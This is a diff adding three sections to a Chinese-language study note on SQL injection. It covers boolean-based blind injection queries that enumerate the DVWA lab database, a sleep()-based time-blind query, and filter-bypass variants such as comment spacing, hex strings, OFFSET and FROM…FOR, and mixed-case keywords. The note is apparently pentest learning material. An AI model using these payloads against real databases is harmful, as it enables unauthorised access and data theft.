@@ -110,6 +110,53 @@ with connect.cursor() as cursor:
 #使用预编译的SQL语句，SQL语句的语义不会改变。
 #在PHP中使用?进行占位
 ```
+14、基于布尔值盲注
+```text
+1、首先判断数据库名称长度
+select user,password from users where user_id = 1 and (length(database()))=4;
+2、获取数据库名称
+select user,password from users where user_id = '1' and mid((select schema_name from information_schema.SCHEMATA limit 1,1),1,4)='dvwa';
+3、获取表的数量
+select user,password from users where user_id = '1' and (select count(table_name) from information_schema.tables where table_schema=database())=2;
+4、获取表名长度
+select user,password from users where user_id = '1' and (select length(table_name) from information_schema.tables where TABLE_SCHEMA=database() limit 1,1)=5;
+5、获取表名
+select user,password from users where user_id = '1' and mid((select table_name from information_schema.`TABLES` where TABLE_SCHEMA = database() limit 1,1),1,5)='users';
+6、获取列名个数
+select user,password from users where user_id = '1' and (select count(column_name) from information_schema.columns where table_name='users')=8;
+7、获取列名长度
+user_id
+select user,password from users where user_id = '1' and (select length(column_name) from information_schema.columns where table_name='users' limit 0,1)=7;
+8、获取列名
+select user,password from users where user_id = '1' and mid((select column_name from information_schema.`COLUMNS` where table_name = 'users' limit 3,1),1,4)='user';
+9、获取数据长度
+select user,password from users where user_id = '1' and (select count(user) from users limit 0,1)=5;
+10、获取用户名数据
+select user,password from users where user_id = '1' and mid((select user from dvwa.users limit 0,1),1,5)='admin';
+```
+15、基于时间盲注
+```text
+select user,password from users where user_id = 1 and if((length(database()))=4,sleep(5),0);
+当条件成立时sleep5秒，否则直接执行
+```
+16、sql注入绕过
+```text
+1、空格被过滤：可以使用注释绕过，或使用括号绕过
+select user,password from users where user_id=1/**/union/**/select/**/database(),user();
+select(user),(password)from(users)where(user_id=1)union select(database()),(user());
+2、引号被过滤：使用16进制绕过
+select user,password from users where user=0x61646D696E union select database(),user();
+3、逗号被过滤
+limit的逗号被过滤使用offset
+mid的逗号被过滤使用from for
+select user,password from users where user_id = '1' and mid((select schema_name from information_schema.SCHEMATA limit 1 offset 1) from 1 for 4)='dvwa';
+
+select user,password from users where user_id = 1 union select 1,2可以替换为:
+select user,password from users where user_id=1 union select * from (select 1)a join (select 2)b;
+4、绕过关键字使用大小写关键字
+select user,password from users where user_id=1 UNiON SeLeCt 1,2;
+参考文章:https://www.admincms.top/blogzone/2019-08-14/160.html
+```
 
 ***
 不定期分享一些python开发,逆向破解、渗透测试相关文章,欢迎大家关注.  
